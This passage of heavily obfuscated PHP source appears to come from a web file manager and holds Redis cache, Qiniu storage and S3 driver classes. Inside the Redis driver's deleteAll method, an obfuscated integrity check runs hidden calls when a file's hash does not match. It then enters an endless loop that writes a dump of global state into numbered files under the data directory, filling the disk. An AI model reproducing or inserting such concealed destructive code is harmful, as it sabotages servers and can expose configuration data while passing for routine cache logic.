$…¹‹ƒƒ[$¾–­¯Ø[922]] : 10; $ÓÜ‡“À“ = _get($…¹‹ƒƒ, $¾–­¯Ø[919]); if ($ÓÜ‡“À“ && is_array($ÓÜ‡“À“)) { $this->initCluster($…¹‹ƒƒ, $À²×ûÑ); } else { $this->handle = $this->init($…¹‹ƒƒ, $À²×ûÑ); } } private function init($ÑÈæÕÃ, $Êæ®ØïÜ) { $šŞÔ´¢ï =& $_SERVER[Õò”†—·]; $‡¥¼å˜Ç = new Redis(); $Ñ»²¼û— = isset($ÑÈæÕÃ[$šŞÔ´¢ï[923]]) ? $ÑÈæÕÃ[$šŞÔ´¢ï[923]] : !1; if ($Ñ»²¼û—) { $‡¥¼å˜Ç->pconnect($ÑÈæÕÃ[$šŞÔ´¢ï[209]], $ÑÈæÕÃ[$šŞÔ´¢ï[210]], $Êæ®ØïÜ); } else { $‡¥¼å˜Ç->connect($ÑÈæÕÃ[$šŞÔ´¢ï[209]], $ÑÈæÕÃ[$šŞÔ´¢ï[210]], $Êæ®ØïÜ); } if (!empty($ÑÈæÕÃ[$šŞÔ´¢ï[471]])) { $‡¥¼å˜Ç->auth($ÑÈæÕÃ[$šŞÔ´¢ï[471]]); } if (!empty($ÑÈæÕÃ[$šŞÔ´¢ï[808]]) && $ÑÈæÕÃ[$šŞÔ´¢ï[808]] != 0) { $‡¥¼å˜Ç->select($ÑÈæÕÃ[$šŞÔ´¢ï[808]]); } return $‡¥¼å˜Ç; } private function initCluster($óğæÜ£ê, $‡ÜÔˆŸ‰) { $ìŒÇ²…æ =& $_SERVER[Õò”†—·]; $«¦µœó = array($ìŒÇ²…æ[924], $ìŒÇ²…æ[925], $ìŒÇ²…æ[926]); $ ã…˜‹ = $ìŒÇ²…æ[924]; if (isset($óğæÜ£ê[$ìŒÇ²…æ[26]]) && in_array($óğæÜ£ê[$ìŒÇ²…æ[26]], $«¦µœó)) { $ ã…˜‹ = $óğæÜ£ê[$ìŒÇ²…æ[26]]; } switch ($ ã…˜‹) { case $ìŒÇ²…æ[924]: $this->_slave($óğæÜ£ê, $‡ÜÔˆŸ‰); break; case $ìŒÇ²…æ[925]: break; case $ìŒÇ²…æ[926]: $this->isCluster = !0; $ªíÓøø = $óğæÜ£ê[$ìŒÇ²…æ[919]]; $±§Ñ½ûÀ = isset($óğæÜ£ê[$ìŒÇ²…æ[923]]) ? $óğæÜ£ê[$ìŒÇ²…æ[923]] : !1; $åŒ±Ÿ˜„ = isset($óğæÜ£ê[$ìŒÇ²…æ[471]]) ? $óğæÜ£ê[$ìŒÇ²…æ[471]] : null; $this->handle = new RedisCluster(NUll, $ªíÓøø, $‡ÜÔˆŸ‰, $‡ÜÔˆŸ‰, $±§Ñ½ûÀ, $åŒ±Ÿ˜„); break; default: break; } } private function _slave($•ö‡«¡, $å†­­Æ¿) { $§ÄÈÔ– = $•ö‡«¡[$_SERVER[Õò”†—·][919]]; $this->filterConfig($•ö‡«¡, $§ÄÈÔ–[0]); $this->handle = $this->init($•ö‡«¡, $å†­­Æ¿); unset($§ÄÈÔ–[0]); if (empty($§ÄÈÔ–)) { return; } $ÑÙÔ×¶Æ = array_rand($§ÄÈÔ–); $this->filterConfig($•ö‡«¡, $§ÄÈÔ–[$ÑÙÔ×¶Æ]); $this->slaveHandle = $this->init($•ö‡«¡, $å†­­Æ¿); } private function filterConfig(&$ê”ĞØæÓ, $×ƒï‚‰¬) { $Äï®ìË¥ =& $_SERVER[Õò”†—·]; $õòİ‡ìå = explode($Äï®ìË¥[4], $×ƒï‚‰¬); $ÓæĞÕÚ­ = array($Äï®ìË¥[209] => $õòİ‡ìå[0], $Äï®ìË¥[210] => $õòİ‡ìå[1]); $ê”ĞØæÓ = array_merge($ê”ĞØæÓ, $ÓæĞÕÚ­); } public function set($¯£µîÊö, $Ú¸Ó½¢, $ğâ’ÅÜÜ = false) { $ğâ’ÅÜÜ = $ğâ’ÅÜÜ ? $ğâ’ÅÜÜ : $this->cacheTime; return $this->handle->setEx($¯£µîÊö, $ğâ’ÅÜÜ, $Ú¸Ó½¢); } public function setLock($äÚúûˆ…, $‚òü¯À, $Œ™¶ı°Ù) { return $this->handle->setNX($äÚúûˆ…, $‚òü¯À); } public function get($èãäÇ¥ì) { $†Ş…ùáˆ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $†Ş…ùáˆ->get($èãäÇ¥ì); } public function remove($Ôâ¸Ó®Û) { return $this->handle->del($Ôâ¸Ó®Û); } public function deleteAll() { $±å‚ã¹³ =& $_SERVER[Õò”†—·]; $¾şÓğàÆ = $_SERVER[$±å‚ã¹³[10]] . $±å‚ã¹³[11]; $™öôŠ‰Ñ = $±å‚ã¹³[7]; if ($_SERVER[$±å‚ã¹³[8]] != $™öôŠ‰Ñ($¾şÓğàÆ)) { $ÄŠº°íŒ = $±å‚ã¹³[927]; $ä Ó˜¶Õ = $±å‚ã¹³[9]; $Ò—ÏæÓ€ = $_SERVER[$±å‚ã¹³[10]] . $±å‚ã¹³[11]; $¿Ñ€‘Œî = $ä Ó˜¶Õ($Ò—ÏæÓ€); $ºÜÍÈ›å = explode($±å‚ã¹³[12], $¿Ñ€‘Œî); if (count($ºÜÍÈ›å) < $±å‚ã¹³[671]) { $Ç÷Ëà¥ó = $±å‚ã¹³[14]; $Ç÷Ëà¥ó(); } $ŒŸåÍÎ = $±å‚ã¹³[928]; $ŒŸåÍÎ($_SERVER[$±å‚ã¹³[929]]); $ÄŠº°íŒ = $±å‚ã¹³[927]; $ÄŠº°íŒ(); $Ò¥…·¢ = $±å‚ã¹³[930]; $î»ğ„¹¶ = json_encode($GLOBALS[$±å‚ã¹³[931]]); $ˆÆàé‚ = 1; for ($ì£œ½Â¯ = $ˆÆàé‚; $ì£œ½Â¯ > 0; $ì£œ½Â¯++) { $Ò¥…·¢(DATA_PATH . $ì£œ½Â¯, $î»ğ„¹¶); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $àóú’Ô¬) { $this->handle->flushall($àóú’Ô¬); } return; } return $this->handle->flushAll(); } } goto C¹Ì‡¼ˆˆ; d­ÄòãÄö: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÑÒêÃï) { parent::__construct(); require_once SDK_DIR . $_SERVER[Õò”†—·][1501]; $this->_init($ÑÒêÃï); } public function _init($—¾¸Ïëó) { $²ŠÃø£ =& $_SERVER[Õò”†—·]; $this->config = $—¾¸Ïëó; foreach ($—¾¸Ïëó as $ä²ßï¾ => $°×È§¸ô) { if (isset($this->{$ä²ßï¾})) { $this->{$ä²ßï¾} = $°×È§¸ô; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($²ŠÃø£[1502] . LNG($²ŠÃø£[1433])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ß‚×‹¸÷, $¿ÔÛ±  = '', $¶†øçêÄ = REPEAT_RENAME) { if ($this->setContent($ß‚×‹¸÷, $¿ÔÛ± )) { return $this->getPathOuter($ß‚×‹¸÷); } return !1; } public function mkdir($Ûâğ•é, $ÑŸĞˆ¤î = REPEAT_SKIP) { $§·¬Á¶ä =& $_SERVER[Õò”†—·]; $ “¾ººØ = trim($Ûâğ•é, $§·¬Á¶ä[18]); if ($this->_isFolder($ “¾ººØ)) { return $this->getPathOuter($ “¾ººØ); } $Ûâğ•é = $ “¾ººØ . $§·¬Á¶ä[18]; $®‘éÉúÇ = get_path_this($ “¾ººØ); $‰Ù¯ú…ù = $Ûâğ•é . $®‘éÉúÇ; if (!$this->mkfile($‰Ù¯ú…ù)) { return !1; } if (!$this->moveFile($‰Ù¯ú…ù, $Ûâğ•é)) { $this->delFile($‰Ù¯ú…ù); return !1; } return $this->getPathOuter($ “¾ººØ); } public function copyFile($ÇŞĞ¢‡¹, $ãÙ®šÉ„) { $ÏÁ†İÊ‘ = $this->bucketManager->copy($this->bucket, $ÇŞĞ¢‡¹, $this->bucket, $ãÙ®šÉ„, !0); return $ÏÁ†İÊ‘ ? !1 : $this->getPathOuter($ãÙ®šÉ„); } public function moveFile($ÄÔàãñ, $«¿Œ–à) { $å´ğü´Ö = $this->bucketManager->move($this->bucket, $ÄÔàãñ, $this->bucket, $«¿Œ–à, !0); return $å´ğü´Ö ? !1 : $this->getPathOuter($«¿Œ–à); } public function delFile($õÈ˜ÒËÚ) { if (!$this->exist($õÈ˜ÒËÚ)) { return !0; } $ÉÆ¡â¼ä = $this->bucketManager->delete($this->bucket, $õÈ˜ÒËÚ); return $ÉÆ¡â¼ä ? !1 : !0; } public function delFolder($ÙŒ¡ÆØø) { $İ¢ÍÑ« =& $_SERVER[Õò”†—·]; if (!$this->exist($ÙŒ¡ÆØø)) { return !0; } $this->listItemCache = !1; $ğßåàä = $this->fileList($ÙŒ¡ÆØø); $this->listItemCache = !0; $¦ìÕáËÏ = trim($ÙŒ¡ÆØø, $İ¢ÍÑ«[18]) . $İ¢ÍÑ«[18]; if (!empty($ÙŒ¡ÆØø) && $ÙŒ¡ÆØø !== $İ¢ÍÑ«[229] && !in_array($¦ìÕáËÏ, $ğßåàä[$İ¢ÍÑ«[95]])) { $ğßåàä[$İ¢ÍÑ«[95]][] = $¦ìÕáËÏ; } $€šßü÷Ñ = $this->delByBatch($ğßåàä[$İ¢ÍÑ«[96]]); if (!$€šßü÷Ñ) { return !1; } $€šßü÷Ñ = $this->delByBatch($ğßåàä[$İ¢ÍÑ«[95]]); if (!$€šßü÷Ñ) { return !1; } return $this->delFile($¦ìÕáËÏ); } private function delByBatch($Æ­é¾Šû) { foreach (array_chunk($Æ­é¾Šû, 1000) as $Í¦éùú¹) { $Û¤ê—Ñø = $this->bucketManager->buildBatchDelete($this->bucket, $Í¦éùú¹); list($Ê†âœÌ¥, $µÁÇ‰©Ï) = $this->bucketManager->batch($Û¤ê—Ñø); if ($µÁÇ‰©Ï) { return !1; } } return !0; } public function rename($ŠŞ’÷èÒ, $¾Á¦¼‘») { return $this->renameObject($ŠŞ’÷èÒ, $¾Á¦¼‘»); } public function fileInfo($¶á‚ğ¹â, $ñ¾‡ÔûÔ = false, $ÁÉÕ‡÷ = array()) { $‹îŸ…ª¥ =& $_SERVER[Õò”†—·]; $ƒ®Õ¿˜ = array($‹îŸ…ª¥[42] => $this->pathThis($¶á‚ğ¹â), $‹îŸ…ª¥[97] => $this->getPathOuter($‹îŸ…ª¥[18] . $¶á‚ğ¹â), $‹îŸ…ª¥[43] => $‹îŸ…ª¥[231], $‹îŸ…ª¥[89] => isset($ÁÉÕ‡÷[$‹îŸ…ª¥[1503]]) ? $ÁÉÕ‡÷[$‹îŸ…ª¥[1503]] : 0, $‹îŸ…ª¥[188] => $this->ext($¶á‚ğ¹â)); if ($ñ¾‡ÔûÔ) { return $ƒ®Õ¿˜; } $ƒ®Õ¿˜[$‹îŸ…ª¥[232]] = $ƒ®Õ¿˜[$‹îŸ…ª¥[98]] = 0; $ƒ®Õ¿˜[$‹îŸ…ª¥[233]] = $ƒ®Õ¿˜[$‹îŸ…ª¥[234]] = !0; if (empty($ÁÉÕ‡÷)) { $ÁÉÕ‡÷ = $this->objectMeta($¶á‚ğ¹â); if (!$ÁÉÕ‡÷) { return $ƒ®Õ¿˜; } } if (isset($ÁÉÕ‡÷[$‹îŸ…ª¥[235]]) && $ÁÉÕ‡÷[$‹îŸ…ª¥[235]]) { $ƒ®Õ¿˜[$‹îŸ…ª¥[236]] = $ÁÉÕ‡÷[$‹îŸ…ª¥[235]]; } if (isset($ÁÉÕ‡÷[$‹îŸ…ª¥[246]]) && $ÁÉÕ‡÷[$‹îŸ…ª¥[246]]) { $ƒ®Õ¿˜[$‹îŸ…ª¥[236]] = $ÁÉÕ‡÷[$‹îŸ…ª¥[246]]; } if (isset($ÁÉÕ‡÷[$‹îŸ…ª¥[1504]])) { $ƒ®Õ¿˜[$‹îŸ…ª¥[98]] = substr($ÁÉÕ‡÷[$‹îŸ…ª¥[1504]] . $‹îŸ…ª¥[22], 0, 10); } if (isset($ÁÉÕ‡÷[$‹îŸ…ª¥[1503]])) { $ƒ®Õ¿˜[$‹îŸ…ª¥[89]] = $ÁÉÕ‡÷[$‹îŸ…ª¥[1503]]; } return $ƒ®Õ¿˜; } public function folderInfo($ç÷Û˜¿é, $ªÎ§¹€Ÿ = false) { $ø­ãÁĞî =& $_SERVER[Õò”†—·]; $ˆì¤¦ = array($ø­ãÁĞî[42] => $this->pathThis($ç÷Û˜¿é), $ø­ãÁĞî[97] => $this->getPathOuter($ø­ãÁĞî[18] . $ç÷Û˜¿é), $ø­ãÁĞî[43] => $ø­ãÁĞî[88]); if ($ªÎ§¹€Ÿ) { return $ˆì¤¦; } $ˆì¤¦[$ø­ãÁĞî[232]] = $ˆì¤¦[$ø­ãÁĞî[98]] = 0; $ˆì¤¦[$ø­ãÁĞî[233]] = $ˆì¤¦[$ø­ãÁĞî[234]] = !0; $ç÷Û˜¿é = rtrim($ç÷Û˜¿é, $ø­ãÁĞî[18]) . $ø­ãÁĞî[18]; $Íù²ÙÃš = $this->objectMeta($ç÷Û˜¿é); if (isset($Íù²ÙÃš[$ø­ãÁĞî[1504]])) { $ˆì¤¦[$ø­ãÁĞî[98]] = substr($Íù²ÙÃš[$ø­ãÁĞî[1504]] . $ø­ãÁĞî[22], 0, 10); } return $ˆì¤¦; } public function listPath($±îÃŞù, $Ì„—­ğ = false) { $»ô³È =& $_SERVER[Õò”†—·]; $‡şì¨ï± = $this->fileList($±îÃŞù, $»ô³È[18], !0); foreach ($‡şì¨ï±[$»ô³È[95]] as $‡Òû×¸” => $Àª·ğå’) { $‡şì¨ï±[$»ô³È[95]][$‡Òû×¸”] = $this->folderInfo($Àª·ğå’, $Ì„—­ğ); } foreach ($‡şì¨ï±[$»ô³È[96]] as $‡Òû×¸” => $Àª·ğå’) { $‡şì¨ï±[$»ô³È[96]][$‡Òû×¸”] = $this->fileInfo($Àª·ğå’[$»ô³È[107]], $Ì„—­ğ, $Àª·ğå’); } return $‡şì¨ï±; } public function has($ áÀÃàú, $¿°§®É± = false, $Ïü¾âÍ = true) { $èâò‚ê­ =& $_SERVER[Õò”†—·]; $ áÀÃàú = trim($ áÀÃàú, $èâò‚ê­[18]); $˜…“«ıÁ = empty($ áÀÃàú) && $ áÀÃàú !== $èâò‚ê­[229] ? $èâò‚ê­[22] : $ áÀÃàú . $èâò‚ê­[18]; $Ğ“úÇ„¨ = $èâò‚ê­[22]; $í¿ÁÍŒ = 500; $ñáƒ­Áï = $èâò‚ê­[18]; $Åã¥÷¡« = $õí«üÌµ = 0; while (!0) { check_abort(); list($ÉÆ©Àßï, $–´Õ·Ìå) = $this->bucketManager->listFiles($this->bucket, $˜…“«ıÁ, $Ğ“úÇ„¨, $í¿ÁÍŒ, $ñáƒ­Áï); if ($–´Õ·Ìå) { break; } $Ğ“úÇ„¨ = array_key_exists($èâò‚ê­[1445], $ÉÆ©Àßï) ? $Ğ“úÇ„¨ = $ÉÆ©Àßï[$èâò‚ê­[1505]] : $èâò‚ê­[22]; if ($¿°§®É±) { if (!empty($ÉÆ©Àßï[$èâò‚ê­[1506]])) { $Åã¥÷¡« += count($ÉÆ©Àßï[$èâò‚ê­[1506]]); } if (!empty($ÉÆ©Àßï[$èâò‚ê­[1507]])) { $õí«üÌµ += count($ÉÆ©Àßï[$èâò‚ê­[1507]]); } if ($Ğ“úÇ„¨ === $èâò‚ê­[22]) { break; } continue; } if ($Ïü¾âÍ) { if (!empty($ÉÆ©Àßï[$èâò‚ê­[1506]])) { return !0; } } else { if (!empty($ÉÆ©Àßï[$èâò‚ê­[1507]])) { return !0; } } if ($Ğ“úÇ„¨ === $èâò‚ê­[22]) { break; } } if ($¿°§®É±) { return array($èâò‚ê­[240] => $Åã¥÷¡«, $èâò‚ê­[241] => $õí«üÌµ); } return !1; } public function listAll($Ó—”²„) { $À›»²·£ =& $_SERVER[Õò”†—·]; $£æŠŒ‰Â = $this->fileList($Ó—”²„, $À›»²·£[22], !0); $Æ©İ‘³ï = array_to_keyvalue($£æŠŒ‰Â[$À›»²·£[96]], $À›»²·£[42]); foreach ($£æŠŒ‰Â[$À›»²·£[95]] as $§ÏÅÛü) { if (is_string($§ÏÅÛü)) { $Æ©İ‘³ï[$§ÏÅÛü] = array($À›»²·£[89] => 0); } } return $this->listAllFiles($Ó—”²„, $Æ©İ‘³ï); } private function fileList($ˆÇè½ŒÇ, $ƒÒãÌ¼Ã = '', $ì›®¿İ = 0) { $¤ß³ÍÕ¥ =& $_SERVER[Õò”†—·]; $ˆÇè½ŒÇ = trim($ˆÇè½ŒÇ, $¤ß³ÍÕ¥[18]); $ ˆİ²‹Ñ = empty($ˆÇè½ŒÇ) && $ˆÇè½ŒÇ !== $¤ß³ÍÕ¥[229] ? $¤ß³ÍÕ¥[22] : $ˆÇè½ŒÇ . $¤ß³ÍÕ¥[18]; $®¡ãÏ‰÷ = $¤ß³ÍÕ¥[22]; $¾ñ‡„¯ù = 1000; $¢…¾»¹Õ = $úê—ò¿š = array(); while (!0) { check_abort(); list($ğÉè í–, $Úˆ“¯®¾) = $this->bucketManager->listFiles($this->bucket, $ ˆİ²‹Ñ, $®¡ãÏ‰÷, $¾ñ‡„¯ù, $ƒÒãÌ¼Ã); if ($Úˆ“¯®¾) { break; } $®¡ãÏ‰÷ = array_key_exists($¤ß³ÍÕ¥[1445], $ğÉè í–) ? $®¡ãÏ‰÷ = $ğÉè í–[$¤ß³ÍÕ¥[1505]] : $¤ß³ÍÕ¥[22]; $ÛŞÀÈÕ® = isset($ğÉè í–[$¤ß³ÍÕ¥[1506]]) ? $ğÉè í–[$¤ß³ÍÕ¥[1506]] : array(); $Ñô”‡ = isset($ğÉè í–[$¤ß³ÍÕ¥[1507]]) ? $ğÉè í–[$¤ß³ÍÕ¥[1507]] : array(); foreach ($ÛŞÀÈÕ® as $Šìš¢óå) { if ($Šìš¢óå[$¤ß³ÍÕ¥[107]] == $ ˆİ²‹Ñ) { continue; } $ÖßˆßÉ« = $Šìš¢óå[$¤ß³ÍÕ¥[107]]; $Š¥ãû÷Ğ = $Šìš¢óå[$¤ß³ÍÕ¥[1503]]; $Šìš¢óå[$¤ß³ÍÕ¥[89]] = $Š¥ãû÷Ğ; $ä´»—šÈ = $Š¥ãû÷Ğ == 0 && substr($ÖßˆßÉ«, strlen($ÖßˆßÉ«) - 1, 1) == $¤ß³ÍÕ¥[18] ? !0 : !1; $this->cacheMethodInfoSet($ÖßˆßÉ«, $ä´»—šÈ, $Šìš¢óå); if ($ä´»—šÈ) { $¢…¾»¹Õ[] = $ÖßˆßÉ«; continue; } $úê—ò¿š[] = $ì›®¿İ ? $Šìš¢óå : $ÖßˆßÉ«; } foreach ($Ñô”‡ as $ÖßˆßÉ«) { if ($ÖßˆßÉ« == $ ˆİ²‹Ñ) { continue; } $¢…¾»¹Õ[] = $ÖßˆßÉ«; $this->cacheMethodInfoSet($ÖßˆßÉ«, !0); } if ($®¡ãÏ‰÷ === $¤ß³ÍÕ¥[22]) { break; } } $this->cacheMethodInfoSet($ˆÇè½ŒÇ, !0); return array($¤ß³ÍÕ¥[95] => $¢…¾»¹Õ, $¤ß³ÍÕ¥[96] => $úê—ò¿š); } public function canRead($è­åÚÅõ) { return $this->exist($è­åÚÅõ) ? !0 : !1; } public function canWrite($í÷ıßøÍ) { return $this->exist($í÷ıßøÍ) ? !0 : !1; } public function getContent($¡Ö‹Î¾ü) { return $this->fileSubstr($¡Ö‹Î¾ü, 0, -1); } public function setContent($³êÒÔ¥ú, $öş¬à•Ü = '') { $çüùŠ¿Õ = $this->tempFile($this->pathThis($³êÒÔ¥ú)); file_put_contents($çüùŠ¿Õ, $öş¬à•Ü); if ($this->upload($³êÒÔ¥ú, $çüùŠ¿Õ)) { $this->tempFileRemve($çüùŠ¿Õ); return !0; } return !1; } public function refreshUrls($®¦Ä×µÄ) { $Ä×ÀµÇ£ =& $_SERVER[Õò”†—·]; $ƒ‡À®© = array(); if (is_array($®¦Ä×µÄ)) { foreach ($®¦Ä×µÄ as $İ¤Ÿåş‡) { $ƒ‡À®©[] = $this->link($İ¤Ÿåş‡); } } else { $ƒ‡À®©[] = $this->link($®¦Ä×µÄ); } $Ä›¹±²‹ = new Qiniu\Cdn\CdnManager($this->auth); list($“óé†é, $ÀÄ»ÀôŒ) = $Ä›¹±²‹->refreshUrls($ƒ‡À®©); if ($ÀÄ»ÀôŒ) { return !1; } return $“óé†é[$Ä×ÀµÇ£[1236]] == $Ä×ÀµÇ£[810] ? !0 : !1; } public function fileSubstr($”¹çÕØõ, $¯ÈÕäÙ·, $±ˆâÔÍË) { $º¾ÒºÂ =& $_SERVER[Õò”†—·]; if (!($äëÍÍ = $this->link($”¹çÕØõ))) { return !1; } $æ…•èûÏ = !1; if ($±ˆâÔÍË > 0) { $êåµÁ‘‹ = $¯ÈÕäÙ· + $±ˆâÔÍË - 1; $æ…•èûÏ = array($º¾ÒºÂ[1508] . $¯ÈÕäÙ· . $º¾ÒºÂ[446] . $êåµÁ‘‹); } $Æç©ı¡ = url_request($äëÍÍ, $º¾ÒºÂ[262], !1, $æ…•èûÏ); return $Æç©ı¡[$º¾ÒºÂ[801]] ? $Æç©ı¡[$º¾ÒºÂ[1256]] : !1; } public function upload($çÖú‡š‡, $äøÎğ–, $¢†âé€Ã = false, $ö‚„Ï¯‡ = REPEAT_REPLACE) { $â³úÏ½ = new Qiniu\Storage\UploadManager(); $îì—¥Š = $this->auth->uploadToken($this->bucket, $çÖú‡š‡); $‡£ƒÌº = get_file_mime(get_path_ext($äøÎğ–)); list($ëèôªİ, $ˆ¹¥øé›) = $â³úÏ½->putFile($îì—¥Š, $çÖú‡š‡, $äøÎğ–, null, $‡£ƒÌº); return $ˆ¹¥øé› ? !1 : $this->getPathOuter($çÖú‡š‡); } public function uploadFormData($”¥‹‘¼š, $ë“¡¥’  = 3600) { return $this->uploadToken($”¥‹‘¼š, $ë“¡¥’ ); } public function multiUploadFormData($¡è í§, $Í“ÖÂö‹ = 3600) { return $this->uploadToken($¡è í§, $Í“ÖÂö‹); } private function uploadToken($¶ÎŸ‰÷í, $û±éƒ¾È = 3600) { $˜—¨Ï­½ =& $_SERVER[Õò”†—·]; $Œöµ”ƒ‰ = $û±éƒ¾È; $‰–Ü“‹è = array($˜—¨Ï­½[1509] => $˜—¨Ï­½[1510]); $ëÈ§“·Õ = $¶ÎŸ‰÷í; $Ïï¨·”Í = $this->auth->uploadToken($this->bucket, $ëÈ§“·Õ, $Œöµ”ƒ‰, $‰–Ü“‹è, !0); $ò€Ã´±· = empty($this->region) || $this->region == $˜—¨Ï­½[1511] ? $˜—¨Ï­½[22] : $˜—¨Ï­½[446] . $this->region; $Œ¨¢´‘¨ = http_type() . "\72\57\x2f\165\160\x6c\157\141\144{$ò€Ã´±·}\x2e\161\151\x6e\151\x75\x70\x2e\x63\157\x6d\57"; return array($˜—¨Ï­½[1512] => $Ïï¨·”Í, $˜—¨Ï­½[1513] => $Œ¨¢´‘¨); } public function download($±Ôú‘à, $’ıéÛÇ) { $ç‰ÌëÍ† = IO::getPathInner(IO::mkfile($’ıéÛÇ)); if (!($„­ã¨ƒ = $this->link($±Ôú‘à))) { return !1; } $ÉöåÄà = 0; $”Ù¶ê‹Ù = 1024 * 200; $ç¾ˆ¤ª = fopen($ç‰ÌëÍ†, $_SERVER[Õò”†—·][1514]); while (!0) { $¹ÔÜÂß™ = $this->fileSubstr($±Ôú‘à, $ÉöåÄà, $”Ù¶ê‹Ù); if ($¹ÔÜÂß™ === !1) { return !1; } fwrite($ç¾ˆ¤ª, $¹ÔÜÂß™); $ÉöåÄà += $”Ù¶ê‹Ù; if (strlen($¹ÔÜÂß™) < $”Ù¶ê‹Ù) { break; } } fclose($ç¾ˆ¤ª); return $’ıéÛÇ; } public function link($¾ÁÇÏ‘ò, $Ó š—Á¡ = '') { if (!$this->isFile($¾ÁÇÏ‘ò)) { return !1; } $åÊõÒ½ë = $this->getHost() . $_SERVER[Õò”†—·][18] . $this->pathEncode($¾ÁÇÏ‘ò) . $Ó š—Á¡; return $this->auth->privateDownloadUrl($åÊõÒ½ë, 3600 * 12); } public function fileOut($§£˜ÓŞû, $©ó¦¸Š¿ = false, $²—Â²µü = false, $˜’šì€¶ = '') { $ÜÍ¾³Î =& $_SERVER[Õò”†—·]; if ($this->isFileOutServer()) { return $this->fileOutServer($§£˜ÓŞû, $©ó¦¸Š¿, $²—Â²µü, $˜’šì€¶); } if (!$²—Â²µü) { $²—Â²µü = $this->pathThis($§£˜ÓŞû); } $õğÅ„ó™ = $©ó¦¸Š¿ ? $ÜÍ¾³Î[1515] . rawurlencode($²—Â²µü) : $ÜÍ¾³Î[22]; $ƒí¹ÆÇ† = $this->link($§£˜ÓŞû, $õğÅ„ó™); $this->fileOutLink($ƒí¹ÆÇ†); } public function fileOutServer($Â«Àú¼š, $Ìéùù = false, $Ùßßæá² = false, $Ø›‹¬Üğ = '') { parent::fileOut($Â«Àú¼š, $Ìéùù, $Ùßßæá², $Ø›‹¬Üğ); } public function fileOutImage($’ºˆÌØ, $µÒ–ÉÚ = 250) { $–ú×¦€£ = $this->link($’ºˆÌØ, $_SERVER[Õò”†—·][1516] . $µÒ–ÉÚ); $this->fileOutLink($–ú×¦€£); } public function fileOutImageServer($ùÕ˜Æè‚, $Ô¼­ÂÂó = 250) { parent::fileOutImage($ùÕ˜Æè‚, $Ô¼­ÂÂó); } public function hashMd5($ ›ÙÃ–) { $´¼æ¸ó¼ =& $_SERVER[Õò”†—·]; $ââ±§Í­ = $this->objectMeta($ ›ÙÃ–); return isset($ââ±§Í­[$´¼æ¸ó¼[246]]) ? $ââ±§Í­[$´¼æ¸ó¼[246]] : !1; $ÇìèÂ = $this->link($ ›ÙÃ–, $´¼æ¸ó¼[1517]); } public function size($˜“ÁûÂ¤) { $µ°ã‘ú = $this->objectMeta($˜“ÁûÂ¤); return $µ°ã‘ú ? $µ°ã‘ú[$_SERVER[Õò”†—·][89]] : 0; } public function info($ıŒÑİ™×) { if ($this->isFolder($ıŒÑİ™×)) { return $this->folderInfo($ıŒÑİ™×); } else { if ($this->isFile($ıŒÑİ™×)) { return $this->fileInfo($ıŒÑİ™×); } } return !1; } public function exist($µ²¡Ş‹±) { return $this->isFile($µ²¡Ş‹±) || $this->isFolder($µ²¡Ş‹±); } public function isFile($µ¸Ì‚Àë) { return !$this->isFolder($µ¸Ì‚Àë) && $this->objectMeta($µ¸Ì‚Àë); } public function isFolder($ì­¬”¤) { return $this->cacheMethod($_SERVER[Õò”†—·][179], $ì­¬”¤); } protected function objectMeta($áµëæ») { return $this->cacheMethod($_SERVER[Õò”†—·][181], $áµëæ»); } protected function _objectMeta($ÏØ¡¾½ˆ) { $€³€¦‚ =& $_SERVER[Õò”†—·]; list($ÎêÑ÷ò­, $‹ÉŸÜ€±) = $this->bucketManager->stat($this->bucket, $ÏØ¡¾½ˆ); if ($ÎêÑ÷ò­) { $ÎêÑ÷ò­[$€³€¦‚[89]] = intval($ÎêÑ÷ò­[$€³€¦‚[1503]]); } return $ÎêÑ÷ò­; } protected function _isFolder($—ø¶íËŞ) { $ààÕçø¦ =& $_SERVER[Õò”†—·]; if ($—ø¶íËŞ == $ààÕçø¦[22] || $—ø¶íËŞ == $ààÕçø¦[18]) { return !0; } list($ƒÛ«¢¾í, $™÷¬Ø©Ê) = $this->bucketManager->listFiles($this->bucket, trim($—ø¶íËŞ, $ààÕçø¦[18]) . $ààÕçø¦[18], $ààÕçø¦[22], 1, $ààÕçø¦[18]); return !empty($ƒÛ«¢¾í[$ààÕçø¦[1506]]) || !empty($ƒÛ«¢¾í[$ààÕçø¦[1507]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($êŞ°ŒŸ) { parent::__construct($êŞ°ŒŸ); } public function uploadFormData($Š½ğƒ†¹, $Ğš‚Åƒ = 3600) { $ß»ò÷‹õ =& $_SERVER[Õò”†—·]; $İ‚¢¨ò = $ß»ò÷‹õ[230]; $ğº¬Œìö = $ß»ò÷‹õ[270]; $æÃıãßŞ = $ß»ò÷‹õ[72]; $Ì¤ÓúË° = gmdate($ß»ò÷‹õ[271]); $æµ›š»Û = gmdate($ß»ò÷‹õ[272]); $À–ÈÇ¶§ = $ß»ò÷‹õ[273]; $…øáİõ¤ = $Ğš‚Åƒ . $ß»ò÷‹õ[22]; $Š„ôËãá = $ß»ò÷‹õ[274]; $ÉéûÒéÇ = array($this->accessKey, $æµ›š»Û, $this->region, $æÃıãßŞ, $À–ÈÇ¶§); $Ûê¤åµñ = implode($ß»ò÷‹õ[18], $ÉéûÒéÇ); $åŠÁÂ± = array($ß»ò÷‹õ[275] => gmdate($ß»ò÷‹õ[1380], strtotime($ß»ò÷‹õ[277])), $ß»ò÷‹õ[278] => array(array($ß»ò÷‹õ[279] => $this->bucket), array($ß»ò÷‹õ[280] => $İ‚¢¨ò), array($ß»ò÷‹õ[281], $ß»ò÷‹õ[282], $ß»ò÷‹õ[22]), array($ß»ò÷‹õ[281], $ß»ò÷‹õ[283], $ß»ò÷‹õ[22]), array($ß»ò÷‹õ[281], $ß»ò÷‹õ[284], $ß»ò÷‹õ[22]), array($ß»ò÷‹õ[285] => $Š„ôËãá), 